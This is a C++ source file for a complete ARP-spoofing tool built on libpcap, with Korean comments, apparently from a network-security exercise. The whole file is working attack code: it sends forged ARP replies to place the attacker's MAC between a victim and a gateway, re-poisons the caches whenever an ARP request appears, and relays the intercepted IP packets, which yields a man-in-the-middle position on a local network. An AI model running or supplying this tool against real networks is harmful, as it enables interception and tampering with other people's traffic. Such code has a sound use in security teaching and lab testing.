#include "utils.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

std::vector<Session> sessions;
std::atomic<bool> running(true);

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

void signalHandler(int) {
    running = false;
}

void poisonSession(pcap_t* handle, const Mac& attackerMac, const Session& s) {
    auto send = [&](const Mac& dmac, Ip sip, const Mac& tmac, Ip tip){
        EthArpPacket pkt;
        pkt.eth_.dmac_ = dmac;
        pkt.eth_.smac_ = attackerMac;
        pkt.eth_.type_ = htons(EthHdr::Arp);

        pkt.arp_.hrd_  = htons(ArpHdr::ETHER);
        pkt.arp_.pro_  = htons(EthHdr::Ip4);
        pkt.arp_.hln_  = Mac::SIZE;
        pkt.arp_.pln_  = Ip::SIZE;
        pkt.arp_.op_   = htons(ArpHdr::Reply);
        pkt.arp_.smac_ = attackerMac;
        pkt.arp_.sip_  = htonl(uint32_t(sip));
        pkt.arp_.tmac_ = tmac;
        pkt.arp_.tip_  = htonl(uint32_t(tip));

        if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(pkt)) != 0) {
            fprintf(stderr, "[!] poison error: %s\n", pcap_geterr(handle));
        }
    };

    send(s.senderMac, s.targetIp, s.senderMac, s.senderIp); // victim에게: gateway IP = attacker MAC
    send(s.targetMac, s.senderIp, s.targetMac, s.targetIp); // gateway에게: victim IP = attacker MAC
}

void relayPacket(pcap_t* handle, const Mac& attackerMac, const u_char* raw, int len) {
    auto eth = reinterpret_cast<const EthHdr*>(raw);
    if (ntohs(eth->type_) != EthHdr::Ip4) return;

    auto ip = reinterpret_cast<const IpHdr*>(raw + sizeof(EthHdr));
    Ip sip(ntohl(ip->sip_)), dip(ntohl(ip->dip_));

    for (auto& s : sessions) {
        if (sip == s.senderIp && dip == s.targetIp) {
            auto buf = new u_char[len];
            memcpy(buf, raw, len);
            auto me = reinterpret_cast<EthHdr*>(buf);
            me->smac_ = attackerMac;
            me->dmac_ = s.targetMac;
            pcap_sendpacket(handle, buf, len);
            delete[] buf;
            break;
        }
        if (sip == s.targetIp && dip == s.senderIp) {
            auto buf = new u_char[len];
            memcpy(buf, raw, len);
            auto me = reinterpret_cast<EthHdr*>(buf);
            me->smac_ = attackerMac;
            me->dmac_ = s.senderMac;
            pcap_sendpacket(handle, buf, len);
            delete[] buf;
            break;
        }
    }
}

void relayLoop(pcap_t* handle, const Mac& attackerMac) {
    while (running) {
        pcap_pkthdr* hdr;
        const u_char* pkt;
        int res = pcap_next_ex(handle, &hdr, &pkt);
        if (res <= 0) {
            if (res < 0) break;
            else continue;
        }

        auto eth = reinterpret_cast<const EthHdr*>(pkt);

        if (ntohs(eth->type_) == EthHdr::Arp) {
            auto arp = reinterpret_cast<const EthArpPacket*>(pkt);
            if (ntohs(arp->arp_.op_) == ArpHdr::Request) {
                Ip sip(ntohl(arp->arp_.sip_));
                Ip tip(ntohl(arp->arp_.tip_));
                for (auto& s : sessions) {
                    if (sip == s.senderIp || tip == s.senderIp ||
                        sip == s.targetIp || tip == s.targetIp) {
                        poisonSession(handle, attackerMac, s);
                        printf("[!] ARP Request detected — Re-poisoned %s <> %s\n",
                               std::string(s.senderIp).c_str(),
                               std::string(s.targetIp).c_str());
                    }
                }
            }
            continue;
        }

        relayPacket(handle, attackerMac, pkt, hdr->len);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return EXIT_FAILURE;
    }
    if (geteuid() != 0) {
        fprintf(stderr, "[!] must run as root\n");
        return EXIT_FAILURE;
    }
    signal(SIGINT, signalHandler);

    const char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        return EXIT_FAILURE;
    }

    Ip attackerIp;
    Mac attackerMac;
    getHostInfo(dev, &attackerIp, &attackerMac);
    printf("[+] Attacker IP: %s\n", std::string(attackerIp).c_str());
    printf("[+] Attacker MAC: %s\n", std::string(attackerMac).c_str());

    for (int i = 2; i < argc; i += 2) {
        Ip senderIp(argv[i]), targetIp(argv[i+1]);
        Mac senderMac = getMac(handle, attackerIp, attackerMac, senderIp);
        Mac targetMac = getMac(handle, attackerIp, attackerMac, targetIp);
        sessions.push_back({ senderIp, senderMac, targetIp, targetMac });

        poisonSession(handle, attackerMac, sessions.back());
        printf("[*] Poisoned %s <> %s\n",
               std::string(senderIp).c_str(),
               std::string(targetIp).c_str());
    }

    // 수동 포워딩 활성화 필요: sudo sysctl -w net.ipv4.ip_forward=1

    std::thread t2(relayLoop, handle, attackerMac);
    t2.join();

    pcap_close(handle);
    return 0;
}
